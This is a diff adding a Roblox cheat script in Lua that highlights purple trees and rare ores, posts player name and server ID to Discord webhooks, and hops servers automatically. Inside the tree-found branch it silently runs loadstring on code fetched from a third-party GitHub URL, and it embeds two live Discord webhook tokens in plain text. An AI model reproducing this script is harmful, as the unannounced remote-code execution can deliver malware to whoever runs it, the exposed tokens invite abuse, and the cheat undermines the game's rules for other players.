@@ -1,0 +1,202 @@
+local rrores = false
+repeat wait() until game:IsLoaded()
+--95% of the code is not mine, I just tweaked it a bit. thanks to The Abacaxl on V3rmillion
+
+local url1 = "https://discord.com/api/webhooks/1047274866119802950/Kr4pij_o0Gyo6KwIsg_7OcmqOyajCXj877aNeYBR23IHuqFFeJ7PsP_PJsBMLjmVk25n" -- Discord WebHook Link
+--[[
+for _,v in pairs(game.Workspace:GetDescendants()) do
+--local rare = {"Fallen Crystal", "Trollite", "Astatine", "Morganite", "Moonstone", "Dumortierite", "Stormite", "Pure Crystal"}
+--local rare = {"Fallen Crystal", "Astatine", "Moonstone", "Dumortierite", "Stormite", "Pure Crystal"}
+local rare = {"Pure Crystal"}
+if v.Name == "MineableRock" and table.find(rare, v.RockString.Value) then
+rrores = true
+		local ServerScriptService = game:GetService("ServerScriptService")
+		local SoundService = game:GetService("SoundService")
+		local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://261082034" -- Will play a notification song when it finds, you can change if u want just change the id.
+		SoundService:PlayLocalSound(sound)
+
+  local BillboardGui = Instance.new("BillboardGui") --UI
+		local TextLabel = Instance.new("TextLabel")
+		BillboardGui.Parent = v.Part
+		BillboardGui.AlwaysOnTop = true
+		BillboardGui.LightInfluence = 1
+		BillboardGui.Size = UDim2.new(0, 50, 0, 50)
+		BillboardGui.StudsOffset = Vector3.new(0, 2, 0)
+
+		TextLabel.Parent = BillboardGui
+		TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+		TextLabel.BackgroundTransparency = 1
+		TextLabel.BorderColor3 = Color3.new(27, 42, 53)
+		TextLabel.BorderSizePixel = 0
+		TextLabel.Font = Enum.Font.GothamBold
+		TextLabel.Size = UDim2.new(1, 0, 1, 0)
+		TextLabel.TextStrokeTransparency = -0.010
+		TextLabel.Text = v.RockString.Value .." Here"
+		TextLabel.TextColor3 = Color3.fromRGB(255, 140, 255)
+		TextLabel.TextScaled = true
+	local data = {
+		["content"] = "",
+		["embeds"] = {
+			{
+				["title"] = v.RockString.Value .. "** FOUND**",
+				["description"] = "" .. game.Players.LocalPlayer.Name.." found a " .. v.RockString.Value .. ", join game:GetService('TeleportService'):TeleportToPlaceInstance(8726743209, '" .. game.JobId .. "', game.Players.LocalPlayer)",
+				["type"] = "rich",
+				["color"] = tonumber(0x51e560),
+				["image"] = {
+					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+						tostring(game:GetService("Players").LocalPlayer.Name)
+				}
+			}
+		}
+	}
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+	local headers = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = url1, Body = newdata, Method = "POST", Headers = headers}
+	request(abcdef)
+end
+end]]
+local trees = false
+local url = "https://discord.com/api/webhooks/1045660994241843320/vJKiTOaJZH2lqT6bbx0MuhU185CaTNuJe9hFfXMBfR2XTJIABy0x1xKPl_H86BHpWGap" -- Discord WebHook Link
+
+print("executed")
+for _,v in pairs(game.Workspace:GetDescendants()) do
+	if v.Name == "Interact" and v.Parent.Name == "Leaf" then
+		trees = true
+		---
+		local ServerScriptService = game:GetService("ServerScriptService")
+		local SoundService = game:GetService("SoundService")
+		local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://261082034" -- Will play a notification song when it finds, you can change if u want just change the id.
+		SoundService:PlayLocalSound(sound)
+		----
+		local BillboardGui = Instance.new("BillboardGui") --UI
+		local TextLabel = Instance.new("TextLabel")
+		BillboardGui.Parent = v.Parent
+		BillboardGui.AlwaysOnTop = true
+		BillboardGui.LightInfluence = 1
+		BillboardGui.Size = UDim2.new(0, 50, 0, 50)
+		BillboardGui.StudsOffset = Vector3.new(0, 2, 0)
+
+		TextLabel.Parent = BillboardGui
+		TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+		TextLabel.BackgroundTransparency = 1
+		TextLabel.BorderColor3 = Color3.new(27, 42, 53)
+		TextLabel.BorderSizePixel = 0
+		TextLabel.Font = Enum.Font.GothamBold
+		TextLabel.Size = UDim2.new(1, 0, 1, 0)
+		TextLabel.TextStrokeTransparency = -0.010
+		TextLabel.Text = "Purple tree here"
+		TextLabel.TextColor3 = Color3.fromRGB(107, 38, 255)
+		TextLabel.TextScaled = true
+	end
+end
+wait(1.5)
+---------------------------------------
+if trees == true then --DISCORD WEBHOOK
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/HEINHARDT/ob/main/obb.lua"))()
+	local data = {
+		["content"] = "",
+		["embeds"] = {
+			{
+				["title"] = "**PURPLE TREE FOUND**",
+				["description"] = "" .. game.Players.LocalPlayer.Name.." found a Purple Tree, jobid ''" .. game.JobId .. "''",
+				["type"] = "rich",
+				["color"] = tonumber(0x7269da),
+				["image"] = {
+					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+						tostring(game:GetService("Players").LocalPlayer.Name)
+				}
+			}
+		}
+	}
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+	local headers = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+	request(abcdef)
+end
+---------------------------------------
+        local PlaceID = game.PlaceId
+local AllIDs = {}
+local foundAnything = ""
+local actualHour = os.date("!*t").hour
+local Deleted = false
+local File = pcall(function()
+    AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
+end)
+if not File then
+    table.insert(AllIDs, actualHour)
+    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+end
+function TPReturner()
+    local Site;
+    if foundAnything == "" then
+        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+    else
+        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+    end
+    local ID = ""
+    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+        foundAnything = Site.nextPageCursor
+    end
+    local num = 0;
+    for i,v in pairs(Site.data) do
+        local Possible = true
+        ID = tostring(v.id)
+        if tonumber(v.maxPlayers) > tonumber(v.playing) then
+            for _,Existing in pairs(AllIDs) do
+                if num ~= 0 then
+                    if ID == tostring(Existing) then
+                        Possible = false
+                    end
+                else
+                    if tonumber(actualHour) ~= tonumber(Existing) then
+                        local delFile = pcall(function()
+                            delfile("NotSameServers.json")
+                            AllIDs = {}
+                            table.insert(AllIDs, actualHour)
+                        end)
+                    end
+                end
+                num = num + 1
+            end
+            if Possible == true then
+                table.insert(AllIDs, ID)
+                wait()
+                pcall(function()
+                    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+                    wait()
+                    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
+                end)
+                wait(4)
+            end
+        end
+    end
+end
+
+function Teleport()
+    while wait() do
+        pcall(function()
+            TPReturner()
+            if foundAnything ~= "" then
+                TPReturner()
+            end
+        end)
+    end
+end
+--------------------------------------
+
+--if not trees then --Server Hopper
+	while trees == false and rrores == false do
+		wait(2) -- Decrease for fast hopping, recommended between 1-5
+Teleport()
+	end
+--end
